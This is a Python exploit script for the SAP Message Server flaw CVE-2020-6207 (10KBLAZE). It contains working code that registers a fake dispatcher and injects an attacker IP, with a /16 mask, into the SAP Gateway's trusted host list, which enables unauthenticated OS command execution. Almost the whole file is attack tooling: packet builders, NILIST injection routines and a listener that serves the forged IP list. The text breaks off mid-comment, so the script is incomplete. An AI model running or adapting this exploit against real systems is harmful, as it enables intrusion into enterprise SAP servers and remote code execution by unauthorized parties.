#!/usr/bin/env python3
"""
sap_ms_betrusted.py – SAP Message Server betrusted exploit (10KBLAZE / CVE-2020-6207).

Registers a fake application server dispatcher with the SAP Message Server,
causing the MS to add the attacker IP to the SAP Gateway's trusted ("internal")
host list.  Once trusted, the gateway allows unauthenticated OS command execution
via the SAPXPG protocol — completing the 10KBLAZE exploit chain.

Attack chain:
  1. Connect to MS internal port (39NN, NN = instance number)
  2. LOGIN_2: register as a fake dispatcher from attacker IP
  3. MOD_STATE: complete registration, appear as an active ABAP application server
  4. ADM CHANGE_IP: explicitly update our IP in the MS routing table
  5. ADM NILIST:   proactively inject attacker IP into the gateway's trust list
  6. Wait for NILIST request from MS and reply (triggers immediate propagation)
  7. MS sends the updated trusted host list to the SAP Gateway
  8. Gateway adds attacker IP to its internal host list → SAPXPG works without auth

Supported kernel variants (DP info sizes/versions):
  - Kernel ~720: dp_version=11, SAPDPInfo2, 203 bytes (--dp-version 11)
  - Kernel ~742/745: dp_version=13, SAPDPInfo1, 507 bytes (default)
  - Kernel 749+: dp_version=14, SAPDPInfo3, 507 bytes (--dp-version 14)

Reference:
  - gelim/sap_ms (Python 2 original: https://github.com/gelim/sap_ms)
  - pysap SAPMS.py (field layouts and opcodes)
  - CVE-2020-6207: Missing authentication check in SAP Message Server
  - 10KBLAZE: Critical SAP vulnerabilities disclosed April 2019 (Onapsis)

For authorized security testing only.
"""

import argparse
import logging
import socket
import struct
import threading
import time
import uuid
import sys

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# SAPMS protocol constants
# ---------------------------------------------------------------------------

_MS_EYE  = b"**MESSAGE**\x00"   # 12 bytes — every SAPMS packet starts here
_ADM_EYE = b"AD-EYECATCH\x00"   # 12 bytes — ADM body after SAPMS header

_HEADER_LEN   = 110  # SAPMS fixed header size (always)
_ADM_HDR_LEN  = 36   # ADM body prefix (kernel 745+ extended format):
                      #   12  (eye "AD-EYECATCH\x00")
                      # +  2  (binary version=0x01, type=0x01)
                      # + 11  (recsize, right-justified 11-char decimal, e.g. "        104")
                      # + 11  (recno,  right-justified 11-char decimal, e.g. "          2")
                      # = 36 bytes before first opcode byte
                      # NOTE: kernel 745 SWAPS recno/recsize order vs. pysap standard.
                      # Confirmed empirically from full ADM packet dump vs. S4H (kernel 745).
_ADM_REC_SIZE = 104  # SAPMSAdmRecord size: 3 (opcode+executed+errorno) + 101 (record)

# flag byte (header offset 66) — packet direction / type
FLAG_UNKNOWN = 0x00
FLAG_ONE_WAY = 0x01
FLAG_REQUEST = 0x02
FLAG_REPLY   = 0x03
FLAG_ADMIN   = 0x04

# iflag byte (header offset 67) — login / state sub-type
IFLAG_SEND_NAME = 0x01
IFLAG_LOGIN     = 0x03
IFLAG_LOGOUT    = 0x04
IFLAG_LOGIN_2   = 0x08   # extended login (sends diag_port)
IFLAG_MOD_STATE = 0x09   # modify registration state (START / ACTIVE)

# msgtype bitmask (header offset 54) — work-process types
MSG_DIA     = 0x01   # Dialogue
MSG_UPD     = 0x02   # Update
MSG_ENQ     = 0x04   # Enqueue
MSG_BTC     = 0x08   # Batch
MSG_SPO     = 0x10   # Spool
MSG_UP2     = 0x20   # Update2
MSG_ICM     = 0x80   # Internet Communication Manager
MSG_ALL     = 0xBB   # DIA|UPD|BTC|SPO|UP2|ICM  (no ENQ)
MSG_DIA_ENQ = 0x05   # DIA|ENQ — used for MOD_STATE START

# domain byte (header offset 56)
DOMAIN_ABAP = 0x00
DOMAIN_J2EE = 0x01

# ADM opcodes (SAPMSAdmRecord.opcode, 1 byte)
ADM_NOOP             = 0x00
ADM_DMP_ACT          = 0x01
ADM_DMP_DEACT        = 0x02
ADM_SERVER_LONG_LIST = 0x05
ADM_DUMP             = 0x06
ADM_NILIST           = 0x07   # inject IP into gateway trust list
ADM_CHANGE_IP        = 0x09   # update registered IP in MS routing table
ADM_SELFIDENT        = 0x13   # "I am" record in NILIST reply (AD_SELFIDENT)
ADM_GET_NILIST_PORT  = 0x3c   # MS asks our registered app server for its IP list.
                               # Reply: 4 ADM records (AD_SELFIDENT + 3× IP records)
                               # sent directly in the ADM reply — NO TCP listener.
                               # Wire opcode = 0x3c confirmed by full ADM packet dump
                               # against S4H kernel 745.  Found at adm[36] (after the
                               # 36-byte extended header).
ADM_FILE_RELOAD      = 0x1E   # reload config files (incl. ACL)

# Opcode in 4-byte opcode section (for non-admin REQUEST/REPLY packets)
OPCODE_NILIST = 0x07   # MS → AppServer: "send me your IP list"

# DP info versions / sizes
DP_VERSION_V11 = 11    # kernel ~720 (old)
DP_VERSION_V13 = 13    # kernel ~742/745 (most common)
DP_VERSION_V14 = 14    # kernel 749+ (newer)
DP_SIZE_V11    = 203   # SAPDPInfo2
DP_SIZE_V13    = 507   # SAPDPInfo1
DP_SIZE_V14    = 507   # SAPDPInfo3

# Registration defaults
DEFAULT_REG_NAME  = "msg_server"   # name to register as (appears as dispatcher)
DEFAULT_DIAG_PORT = 3200           # SAPGUI diag port we advertise


def ms_port(instance_nr: int) -> int:
    """Internal MS port for instance NN: 3900 + NN."""
    return 3900 + instance_nr


# ---------------------------------------------------------------------------
# NI (Network Interface) framing — identical to SAP Gateway protocol
# ---------------------------------------------------------------------------

def ni_send(sock: socket.socket, payload: bytes) -> None:
    """Send payload with a 4-byte big-endian NI length prefix."""
    sock.sendall(struct.pack("!I", len(payload)) + payload)


def ni_recv(sock: socket.socket, timeout: float = 10.0) -> bytes:
    """Receive one SAP NI frame (4-byte length + payload).

    Zero-length frames are NI PING keepalives and are silently skipped.
    """
    sock.settimeout(timeout)
    while True:
        hdr = b""
        while len(hdr) < 4:
            chunk = sock.recv(4 - len(hdr))
            if not chunk:
                raise ConnectionError("Connection closed reading NI header")
            hdr += chunk
        length = struct.unpack("!I", hdr)[0]
        if length == 0:
            continue  # NI PING keepalive — skip and wait for next frame
        if length > 0x400000:  # 4 MB sanity cap
            raise ValueError(f"NI frame too large: {length} bytes")
        data = b""
        while len(data) < length:
            chunk = sock.recv(min(length - len(data), 65536))
            if not chunk:
                raise ConnectionError("Connection closed reading NI payload")
            data += chunk
        return data


def ni_try_recv(sock: socket.socket, timeout: float = 5.0) -> bytes | None:
    """Try to receive one NI frame; return None on timeout or connection close."""
    try:
        return ni_recv(sock, timeout)
    except (socket.timeout, TimeoutError, ConnectionError, OSError):
        return None


# ---------------------------------------------------------------------------
# SAPMS header helpers
# ---------------------------------------------------------------------------

def _pad_name(name, length: int = 40) -> bytes:
    """Encode name as ASCII and right-pad with spaces to *length* bytes."""
    b = name.encode("ascii") if isinstance(name, str) else bytes(name)
    return (b + b" " * length)[:length]


def ms_build_header(toname: str, fromname: str, msgtype: int,
                    flag: int, iflag: int,
                    key: bytes = b"\x00" * 8,
                    diag_port: int = 0,
                    domain: int = DOMAIN_ABAP) -> bytes:
    """Build a 110-byte SAP MS packet header.

    Wire layout:
      [0:12]    eyecatcher  = b"**MESSAGE**\\x00"
      [12]      version     = 4
      [13]      errorno     = 0
      [14:54]   toname      (40 bytes, space-padded)
      [54]      msgtype     (bitmask: MSG_DIA | MSG_UPD | …)
      [55]      reserved    = 0
      [56]      domain      (0=ABAP, 1=J2EE)
      [57]      reserved    = 0
      [58:66]   key         (8-byte session key; all-zeros before login)
      [66]      flag        (FLAG_UNKNOWN/ONE_WAY/REQUEST/REPLY/ADMIN)
      [67]      iflag       (IFLAG_LOGIN_2/MOD_STATE/LOGOUT/…)
      [68:108]  fromname    (40 bytes, space-padded)
      [108:110] diag_port   (big-endian uint16; meaningful only for LOGIN_2)
    """
    assert len(key) == 8, f"session key must be 8 bytes (got {len(key)})"
    h  = _MS_EYE                          # [0:12]
    h += bytes([4, 0])                    # [12] version=4, [13] errorno=0
    h += _pad_name(toname)                # [14:54]
    h += bytes([msgtype, 0, domain, 0])   # [54:58]
    h += key                              # [58:66]
    h += bytes([flag, iflag])             # [66:68]
    h += _pad_name(fromname)              # [68:108]
    h += struct.pack("!H", diag_port)     # [108:110]
    assert len(h) == _HEADER_LEN
    return h


def ms_parse_header(data: bytes) -> dict:
    """Parse a 110-byte SAPMS header. Returns {} on failure."""
    if len(data) < _HEADER_LEN or data[:12] != _MS_EYE:
        return {}
    return {
        "version":   data[12],
        "errorno":   data[13],
        "toname":    data[14:54].rstrip(b" \x00").decode("ascii", errors="replace"),
        "msgtype":   data[54],
        "domain":    data[56],
        "key":       data[58:66],
        "flag":      data[66],
        "iflag":     data[67],
        "fromname":  data[68:108].rstrip(b" \x00").decode("ascii", errors="replace"),
        "diag_port": struct.unpack("!H", data[108:110])[0],
    }


def ms_parse_opcode(data: bytes) -> dict:
    """Parse the 4-byte opcode section that follows the 110-byte header."""
    if len(data) < _HEADER_LEN + 4:
        return {}
    opc = data[_HEADER_LEN:_HEADER_LEN + 4]
    return {"opcode": opc[0], "error": opc[1], "version": opc[2], "charset": opc[3]}


# ---------------------------------------------------------------------------
# Packet builders
# ---------------------------------------------------------------------------

def pkt_login_2(fromname: str, key: bytes = b"\x00" * 8,
                diag_port: int = DEFAULT_DIAG_PORT) -> bytes:
    """LOGIN_2: announce our dispatcher to the MS and request a session key."""
    return ms_build_header(
        toname="", fromname=fromname,
        msgtype=MSG_DIA, flag=FLAG_REQUEST, iflag=IFLAG_LOGIN_2,
        key=key, diag_port=diag_port,
    )


def pkt_logout(fromname: str, key: bytes) -> bytes:
    """LOGOUT: cleanly deregister from MS."""
    return ms_build_header(
        toname="", fromname=fromname,
        msgtype=MSG_DIA, flag=FLAG_ONE_WAY, iflag=IFLAG_LOGOUT,
        key=key,
    )


def pkt_mod_state(fromname: str, key: bytes,
                  msgtype: int, dp_info: bytes) -> bytes:
    """MOD_STATE: modify our registration state.

    Send twice:
      1. msgtype=MSG_DIA_ENQ  (0x05) → START
      2. msgtype=MSG_DIA      (0x01) → ACTIVE
    """
    hdr = ms_build_header(
        toname="", fromname=fromname,
        msgtype=msgtype, flag=FLAG_ONE_WAY, iflag=IFLAG_MOD_STATE,
        key=key,
    )
    return hdr + dp_info


def _adm_record(opcode: int, record_body: bytes, executed: int = 0) -> bytes:
    """Build one 104-byte SAPMSAdmRecord.

    Layout: [opcode 1B][executed 1B][errorno 1B][record 101B] = 104 bytes.
    record_body is truncated or zero-padded to exactly 101 bytes.
    """
    record_body = (record_body + b"\x00" * 101)[:101]
    return bytes([opcode, executed, 0]) + record_body


def pkt_adm(fromname: str, key: bytes, records: list) -> bytes:
    """Build an ADM (admin) packet with one or more SAPMSAdmRecord entries.

    Structure after the 110-byte MS header:
      [0:12]    ADM eyecatcher  = b"AD-EYECATCH\\x00"
      [12:23]   adm_recno       = "%11d" % len(records)   (right-justified, 11 bytes)
      [23:34]   adm_recsize     = "%11d" % 104             (right-justified, 11 bytes)
      [34+]     records         (104 bytes each)
    """
    hdr = ms_build_header(
        toname="", fromname=fromname,
        msgtype=MSG_DIA, flag=FLAG_ADMIN, iflag=0,
        key=key,
    )
    adm  = _ADM_EYE
    adm += ("%11d" % len(records)).encode("ascii")   # recno  (11B)
    adm += ("%11d" % _ADM_REC_SIZE).encode("ascii")  # recsize (11B)
    adm += b"".join(records)
    return hdr + adm


# ---------------------------------------------------------------------------
# ADM record payloads
# ---------------------------------------------------------------------------

def adm_change_ip_record(new_ip: str, old_ip: str = "0.0.0.0") -> bytes:
    """CHANGE_IP ADM record: tell MS our registered IP has changed.

    The MS updates its routing table; the new IP is included in the next
    NILIST it sends to the gateway, making the gateway trust new_ip.

    Record body layout (101 bytes):
      [0:4]    new_ip  (inet_aton)
      [4:8]    old_ip  (inet_aton, or 0.0.0.0 to replace any existing entry)
      [8:101]  zero padding
    """
    body = socket.inet_aton(new_ip) + socket.inet_aton(old_ip)
    return _adm_record(ADM_CHANGE_IP, body)


def _nilist_ip_body(ip: str) -> bytes:
    """Build the 99-byte kernel 745+ IP body for NILIST / AD_GET_NILIST_PORT records.

    Layout: count(4B) + pad(8B) + mask(4B) + ip(4B) + pad(4B) + flags(4B) +
            hostname(70B) + trailing(1B) = 99 bytes.
    _adm_record() zero-pads to 101 bytes.
    """
    hostname_ascii = ip.replace(".", "-").encode("ascii")
    rec  = struct.pack("!I", 1)              # count = 1 entry
    rec += struct.pack("!I", 0)              # padding
    rec += struct.pack("!I", 0)              # padding
    rec += socket.inet_aton("0.0.255.255")   # subnet mask (host-only match)
    rec += socket.inet_aton(ip)              # the IP to trust
    rec += struct.pack("!I", 0)              # padding
    rec += b"\x00\x00\x0c\xe5"               # type/flags (0x0CE5 = 3301)
    rec += hostname_ascii.ljust(70, b"\x00")[:70]  # hostname: ASCII, null-padded
    rec += b" "                              # trailing space
    return rec                               # 99 bytes


def adm_nilist_record(ip: str, kernel_new: bool = True) -> bytes:
    """NILIST ADM record: inject *ip* into the gateway's trusted host list.

    Two wire formats — choose based on target kernel:
      kernel_new=True  (kernel 745+): packed struct with count/mask/ip metadata
      kernel_new=False (kernel ~720): mask + ip + UTF-16-BE hostname field
    """
    if kernel_new:
        rec = _nilist_ip_body(ip)
    else:
        # Kernel ~720 old format
        hostname_ascii = ip.replace(".", "-").encode("ascii")
        rec  = struct.pack("!II", 0, 0)          # 8 bytes padding
        rec += socket.inet_aton("0.0.255.255")   # subnet mask
        rec += socket.inet_aton(ip)              # the IP to trust
        rec += hostname_ascii.ljust(82, b"\x00")[:82]  # hostname: ASCII, null-padded
        # rec is now 98 bytes; _adm_record pads to 101
    return _adm_record(ADM_NILIST, rec)


def adm_server_long_list_record() -> bytes:
    """SERVER_LONG_LIST ADM record: request list of registered servers from MS."""
    return _adm_record(ADM_SERVER_LONG_LIST, b"\x00" * 101)


# ---------------------------------------------------------------------------
# DP info blobs (body for MOD_STATE packets)
# ---------------------------------------------------------------------------

def build_dp_info(server_name: str, instance_nr: int = 0,
                  dp_version: int = DP_VERSION_V13,
                  attacker_ip: str = "") -> bytes:
    """Build a DP info blob to attach to MOD_STATE packets.

    The DP info describes our fake dispatcher (name, instance, version).
    The MS uses it to recognise us as an ABAP application server.

    dp_version=11 → 203 bytes  (SAPDPInfo2, kernel ~720)
    dp_version=13 → 507 bytes  (SAPDPInfo1, kernel 742/745)
    dp_version=14 → 507 bytes  (SAPDPInfo3, kernel 749+)

    Key fields (shared across all versions):
      [0]      dp_len_low   = size & 0xFF
      [1]      dp_version
      [6]      dp_type      = 1 (dispatcher)
      [11:13]  dp_instance  (2 bytes big-endian)
      [13:53]  dp_fromname  (40 bytes, space-padded)
      [61:65]  dp_worker_from_num (4 bytes big-endian)
      [65:69]  dp_respid_from     (4 bytes big-endian)
      [69:73]  dp_addr_from (IP as inet_aton, best-effort)
    """
    size = DP_SIZE_V11 if dp_version <= 11 else DP_SIZE_V13
    blob = bytearray(size)

    blob[0] = size & 0xFF          # dp_len low byte
    blob[1] = dp_version           # dp_version
    blob[6] = 0x01                 # dp_type = 1 (dispatcher)

    struct.pack_into("!H", blob, 11, instance_nr & 0xFFFF)  # dp_instance

    name_b = server_name.encode("ascii")[:40].ljust(40, b" ")
    blob[13:53] = name_b            # dp_fromname

    struct.pack_into("!I", blob, 61, 1)   # dp_worker_from_num
    struct.pack_into("!I", blob, 65, 1)   # dp_respid_from

    if attacker_ip:
        try:
            blob[69:73] = socket.inet_aton(attacker_ip)  # dp_addr_from
        except (socket.error, OverflowError):
            pass

    return bytes(blob)


# ---------------------------------------------------------------------------
# NILIST reply builder
# ---------------------------------------------------------------------------

def build_nilist_reply(fromname: str, key: bytes,
                       attacker_ip: str, kernel_new: bool = True) -> bytes:
    """Build a NILIST reply: ADM NILIST packet containing attacker IP."""
    rec = adm_nilist_record(attacker_ip, kernel_new=kernel_new)
    return pkt_adm(fromname, key, [rec])


def build_nilist_port_reply(fromname: str, key: bytes,
                             nilist_port: int = 0,
                             toname: str = "",
                             iflag: int = IFLAG_SEND_NAME,
                             attacker_ip: str = "") -> bytes:
    """Reply to AD_GET_NILIST_PORT (opcode 0x3c).

    MS log analysis revealed that AD_GET_NILIST_PORT is sent peer-to-peer
    FROM the real app server (e.g. "s4hanadev_S4H_00") TO our fake server,
    routed by the MS.  The reply must therefore be addressed back to the
    original requestor so the MS can route it correctly.

    Callers must pass toname=hdr.get("fromname") from the incoming packet.
    With toname="" the MS has no destination and drops/rejects the reply.

    Flags confirmed from MS log:
      - incoming: flag=MS_REQUEST (0x02), iflag=MS_SEND_NAME (0x01)
      - reply:    flag=MS_REPLY   (0x03), iflag=MS_SEND_NAME (0x01)

    Record format: opcode=0x3c, executed=1 (reply), body[0:2] = port (BE uint16),
    body[2:6] = IP address (BE uint32, optional but critical for DNS-hostile envs).

    Including the IP in body[2:6] lets the dispatcher connect directly using the
    raw IP instead of resolving the server hostname via DNS.  Without it the
    dispatcher does getnameinfo(our_ip) → reverse-DNS hostname → forward DNS →
    potentially NXDOMAIN → never connects to our NILIST listener.

    Header format: kernel 745+ extended ADM (opcode at offset 36 = _ADM_HDR_LEN).

    FLAG_REPLY (0x03) cannot be used here: the MS tries MsSFindCon to route
    a REPLY through a pre-existing mscon slot, but NO mscon slot is created
    for peer-to-peer app-server ADM messages.  MsSFindCon therefore fails
    with rc=4 ("not found") and the MS drops our reply in a "MS LOOP".

    FLAG_ONE_WAY (0x01) routes by name (toname=) without needing any mscon
    slot.  With iflag=IFLAG_SEND_NAME (0x01) the MS accepts and delivers it.
    """
    body = bytearray(101)
    port_bytes = struct.pack("!H", nilist_port & 0xFFFF)   # big-endian uint16
    body[0:2] = port_bytes
    if attacker_ip:
        try:
            body[2:6] = socket.inet_aton(attacker_ip)  # BE uint32 IP address
        except (socket.error, OverflowError):
            pass
    print(f"[*] build_nilist_port_reply: port={nilist_port} "
          f"ip={attacker_ip or '(none)'} "
          f"encoded as port={port_bytes.hex()} ip={body[2:6].hex()} "
          f"flag=FLAG_ONE_WAY → toname={toname!r}")
    # opcode=ADM_GET_NILIST_PORT (0x3c), executed=1 (reply), errorno=0
    rec = bytes([ADM_GET_NILIST_PORT, 1, 0]) + bytes(body)

    # FLAG_ONE_WAY (0x01) + IFLAG_SEND_NAME (0x01): name-routed, no mscon needed.
    # The MS uses toname to find s4hanadev's TCP connection and delivers directly.
    hdr = ms_build_header(
        toname=toname, fromname=fromname,
        msgtype=MSG_DIA, flag=FLAG_ONE_WAY, iflag=iflag,
        key=key,
    )
    # Extended ADM header — kernel 745+ format (recsize BEFORE recno, plus
    # two binary prefix bytes).  Opcode lands at offset 36 = _ADM_HDR_LEN.
    adm  = _ADM_EYE
    adm += b"\x01\x01"                                              # [12:14]
    adm += ("%11d" % _ADM_REC_SIZE).encode("ascii")                 # [14:25] recsize
    adm += ("%11d" % 1).encode("ascii")                             # [25:36] recno
    adm += rec                                                       # [36:] record
    return hdr + adm


def build_nilist_ip_reply(fromname: str, key: bytes,
                           toname: str, attacker_ip: str) -> bytes:
    """Reply to AD_GET_NILIST_PORT for kernel 749+ (dp_version=14).

    Sends IP addresses DIRECTLY in ADM records — no TCP listener involved.

    Based on gelim/sap_ms reference for dp_version=14:
      Record 1: AD_SELFIDENT  (0x13), executed=1, body=spaces×100
      Record 2: AD_GET_NILIST_PORT (0x3c), executed=1, IP body for 127.0.0.1
      Record 3: AD_GET_NILIST_PORT (0x3c), executed=1, IP body for 127.0.0.2
      Record 4: AD_GET_NILIST_PORT (0x3c), executed=1, IP body for attacker_ip

    The MS receives this reply and propagates attacker_ip to the GW trust list.
    """
    rec1 = _adm_record(ADM_SELFIDENT,       b" " * 100,                executed=1)
    rec2 = _adm_record(ADM_GET_NILIST_PORT, _nilist_ip_body("127.0.0.1"), executed=1)
    rec3 = _adm_record(ADM_GET_NILIST_PORT, _nilist_ip_body("127.0.0.2"), executed=1)
    rec4 = _adm_record(ADM_GET_NILIST_PORT, _nilist_ip_body(attacker_ip), executed=1)
    records = [rec1, rec2, rec3, rec4]

    print(f"[*] build_nilist_ip_reply: 4 IP records → toname={toname!r} "
          f"(FLAG_ONE_WAY) IPs: 127.0.0.1, 127.0.0.2, {attacker_ip}")

    hdr = ms_build_header(
        toname=toname, fromname=fromname,
        msgtype=MSG_DIA, flag=FLAG_ONE_WAY, iflag=IFLAG_SEND_NAME,
        key=key,
    )
    # Extended ADM header: kernel 745+ format (recsize BEFORE recno, \x01\x01 prefix)
    adm  = _ADM_EYE
    adm += b"\x01\x01"
    adm += ("%11d" % _ADM_REC_SIZE).encode("ascii")   # recsize
    adm += ("%11d" % len(records)).encode("ascii")     # recno = 4
    adm += b"".join(records)
    return hdr + adm


# ---------------------------------------------------------------------------
# Push-model NILIST: we connect to the dispatcher and push NILIST data
# ---------------------------------------------------------------------------

def _push_nilist_to_dispatcher(dispatcher_ip: str, dispatcher_port: int,
                                attacker_ip: str) -> None:
    """Connect to dispatcher_ip:dispatcher_port and push NILIST data.

    In the PUSH model the dispatcher sets up a TCP listener and tells us
    its port in the AD_GET_NILIST_PORT request body.  We connect and send
    our NILIST frame (attacker_ip to trust).
    """
    hostname_bytes = attacker_ip.replace(".", "-").encode("ascii")
    entry  = struct.pack("!I", 1)
    entry += struct.pack("!I", 0)
    entry += struct.pack("!I", 0)
    entry += socket.inet_aton("0.0.255.255")
    entry += socket.inet_aton(attacker_ip)
    entry += struct.pack("!I", 0)
    entry += b"\x00\x00\x0c\xe5"
    entry += hostname_bytes.ljust(70, b"\x00")[:70]
    entry += b" "
    ni_frame = struct.pack("!I", len(entry)) + entry

    def _do_push():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((dispatcher_ip, dispatcher_port))
            s.sendall(ni_frame)
            print(f"[+] NILIST PUSH sent {len(ni_frame)}B to "
                  f"{dispatcher_ip}:{dispatcher_port} "
                  f"(trusting {attacker_ip})")
            s.close()
        except Exception as e:
            print(f"[!] NILIST push to {dispatcher_ip}:{dispatcher_port} failed: {e}")

    t = threading.Thread(target=_do_push, daemon=True, name="nilist-push")
    t.start()


# ---------------------------------------------------------------------------
# Pull-model NILIST TCP listener
# ---------------------------------------------------------------------------

_NILIST_PORT = 0      # 0 = let OS assign a free port (avoids conflicts between runs)


def _start_nilist_listener(attacker_ip: str,
                            port: int = _NILIST_PORT) -> int:
    """Start a one-shot TCP listener for the pull-model NILIST.

    When the GW receives our AD_GET_NILIST_PORT reply (port=N), it connects
    to attacker_ip:N expecting us to serve an IP list.  We send a minimal
    NI-framed NILIST containing attacker_ip with mask 0.0.255.255 so the GW
    adds the full /16 host-range to its trusted sources.

    Binds on 0.0.0.0 so the GW can reach us regardless of interface aliasing.

    Returns the actual port bound (useful if port=0 was requested), or 0 on
    failure.
    """
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", port))
    except OSError as e:
        print(f"[!] NILIST listener: cannot bind 0.0.0.0:{port}: {e}")
        srv.close()
        return 0
    srv.listen(1)
    actual_port = srv.getsockname()[1]
    print(f"[*] NILIST listener ready on 0.0.0.0:{actual_port} "
          f"(waiting for GW to connect)")

    def _serve():
        srv.settimeout(120)  # MS should connect within 120 s of getting our reply
        try:
            conn, addr = srv.accept()
            print(f"[+] NILIST listener: MS connected from {addr[0]}:{addr[1]}")
            # Read whatever the MS sends first (may be an NI-framed request,
            # a short identify header, or nothing at all).
            conn.settimeout(3)
            request = b""
            try:
                request = conn.recv(1024)
            except (socket.timeout, OSError):
                pass
            if request:
                print(f"[*] NILIST listener: MS sent {len(request)}B: "
                      f"{request[:64].hex()}")
            else:
                print(f"[*] NILIST listener: MS sent no request data (pull without header)")

            # Build the NILIST entry using the kernel 745+ ADM NILIST body
            # format (same layout as adm_nilist_record with kernel_new=True),
            # wrapped in a single NI frame.
            # Format: count(4B) + pad(8B) + mask(4B) + ip(4B) + pad(4B) +
            #         flags(4B) + hostname(70B) + trailing(1B) = 99 bytes
            # Hostname must be ASCII [a-z0-9-] only — GW rejects multibyte/UTF-16.
            hostname_bytes = attacker_ip.replace(".", "-").encode("ascii")
            entry  = struct.pack("!I", 1)              # count = 1 entry
            entry += struct.pack("!I", 0)              # padding
            entry += struct.pack("!I", 0)              # padding
            entry += socket.inet_aton("0.0.255.255")   # subnet mask
            entry += socket.inet_aton(attacker_ip)     # IP to inject
            entry += struct.pack("!I", 0)              # padding
            entry += b"\x00\x00\x0c\xe5"               # type/flags (0x0CE5)
            entry += hostname_bytes.ljust(70, b"\x00")[:70]  # hostname: ASCII, null-padded
            entry += b" "                              # trailing byte
            ni_frame = struct.pack("!I", len(entry)) + entry
            conn.sendall(ni_frame)
            print(f"[+] NILIST served: {attacker_ip}/0.0.255.255 "
                  f"({len(entry)}B kernel-745 format)")

            # Wait for the MS to close the connection (don't close from our side)
            conn.settimeout(10)
            try:
                while True:
                    tail = conn.recv(256)
                    if not tail:
                        break
                    print(f"[*] NILIST listener: MS sent {len(tail)}B after our reply: "
                          f"{tail[:32].hex()}")
            except (socket.timeout, OSError):
                pass
            conn.close()
        except socket.timeout:
            print(f"[!] NILIST listener: nobody connected to {attacker_ip}:{actual_port} "
                  f"within 120s")
            print(f"[!] → Possible cause: FIREWALL on {attacker_ip} is blocking "
                  f"inbound TCP connections from the SAP server.")
            print(f"[!] → Check: sudo pfctl -sr | grep {actual_port}")
            print(f"[!] → Fix:   add firewall rule allowing TCP from SAP server to "
                  f"{attacker_ip}:{actual_port}")
        except Exception as e:
            print(f"[!] NILIST listener error: {e}")
        finally:
            try:
                srv.close()
            except Exception:
                pass

    t = threading.Thread(target=_serve, daemon=True, name="nilist-listener")
    t.start()
    return actual_port


# ---------------------------------------------------------------------------
# Wait-and-reply loop for incoming NILIST requests
# ---------------------------------------------------------------------------

def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
                            attacker_ip: str, wait_secs: float,
                            kernel_new: bool = True) -> bool:
    """Block up to *wait_secs* seconds waiting for a NILIST request from MS.

    The MS sends NILIST requests to registered app servers periodically
    (typically every ~5 minutes) asking "what are your internal IPs?".
    We reply with attacker_ip, which the MS then forwards to the gateway.

    Handles two NILIST request variants:
      - ADM packet (flag=ADMIN) with ADM_NILIST opcode in the record (opcode 0x07)
      - ADM packet with AD_GET_NILIST_PORT opcode (0x20): MS asks for our NILIST
        listener port, we reply with the port, MS connects to our NILIST listener
      - Regular REQUEST with opcode section OPCODE_NILIST

    Returns True if a NILIST request was received and replied to (either variant).
    """
    deadline = time.time() + wait_secs
    nilist_port_replied = False   # True once we've handled AD_GET_NILIST_PORT
    while time.time() < deadline:
        remaining = deadline - time.time()
        try:
            pkt = ni_recv(sock, min(remaining, 1.0))
        except (socket.timeout, TimeoutError):
            continue   # normal idle — keep waiting
        except (ConnectionError, OSError):
            if nilist_port_replied:
                # MS closed the SAPMS connection after getting our port reply —
                # this is NORMAL.  The MS is now connecting to our NILIST
                # listener on the advertised port (daemon thread handles it).
                print(f"[*] Wait: MS closed SAPMS connection after port reply "
                      f"(normal — MS is connecting to NILIST listener now)")
            else:
                logger.debug("NILIST wait: MS closed connection — exiting early")
            break      # socket dead, NILIST listener handles the rest
        if len(pkt) < _HEADER_LEN:
            continue

        hdr = ms_parse_header(pkt)
        if not hdr:
            continue

        flag  = hdr.get("flag", -1)
        iflag = hdr.get("iflag", -1)

        # Log every received packet so we can see what the MS is sending
        opc = ms_parse_opcode(pkt)
        try:
            ip_bytes = socket.inet_aton(attacker_ip)
            ip_in_pkt = " [OUR IP FOUND]" if ip_bytes in pkt else ""
        except Exception:
            ip_in_pkt = ""
        print(
            f"[*] Wait: MS pkt flag={flag:#04x} iflag={iflag:#04x} "
            f"msgtype={hdr.get('msgtype', 0):#04x} "
            f"opcode={opc.get('opcode', -1):#04x} len={len(pkt)} "
            f"body={pkt[_HEADER_LEN:_HEADER_LEN+24].hex()}{ip_in_pkt}"
        )

        # --- Scan full packet for ADM eye-catcher regardless of flag ---
        # SM66 evidence: the MS sends AD_GET_NILIST_PORT inside FLAG_REQUEST
        # (0x02) packets, not FLAG_ADMIN (0x04) packets as we expected.
        # The ADM eye-catcher "AD-EYECATCH\x00" is somewhere in the body but
        # NOT at byte 0 of the body — so the flag-based dispatch misses it.
        # Scan the whole packet for the eye-catcher as the primary handler.
        adm_eye_pos = pkt.find(_ADM_EYE, _HEADER_LEN)
        if adm_eye_pos >= 0:
            adm = pkt[adm_eye_pos:]
            print(f"[*] Wait: ADM eye-catcher found at offset {adm_eye_pos} "
                  f"(flag={flag:#04x}) adm_prefix={adm[:16].hex()}")
            if len(adm) >= _ADM_HDR_LEN + 1:
                first_opcode = adm[_ADM_HDR_LEN]
                print(f"[*] Wait: ADM opcode={first_opcode:#04x}")
                if first_opcode == ADM_NILIST:
                    print(f"[*] ADM NILIST request received — replying with {attacker_ip}")
                    reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
                    ni_send(sock, reply)
                    return True
                if first_opcode == ADM_GET_NILIST_PORT:
                    # Log the full ADM record body.
                    # push_port (body[0:2]) non-zero = dispatcher has a listener
                    # it wants us to connect to (push model).  Zero = dispatcher
                    # will connect to OUR port (pull model — the common case).
                    push_port = 0
                    if len(adm) >= _ADM_HDR_LEN + _ADM_REC_SIZE:
                        rec_raw = adm[_ADM_HDR_LEN:_ADM_HDR_LEN + _ADM_REC_SIZE]
                        executed_flag = rec_raw[1]
                        errorno       = rec_raw[2]
                        rec_body      = rec_raw[3:]           # 101 bytes
                        push_port     = struct.unpack("!H", rec_body[:2])[0]
                        # NOTE: body[0:2] is NOT always a push port.  In practice
                        # the SAP dispatcher embeds requestor identity data in the
                        # body (e.g. b'\x00' + b'00SAPSYS' + spaces) which produces
                        # small spurious values like 32 or 48 when read as BE uint16.
                        # Real push ports (dispatcher's NILIST listener) are always
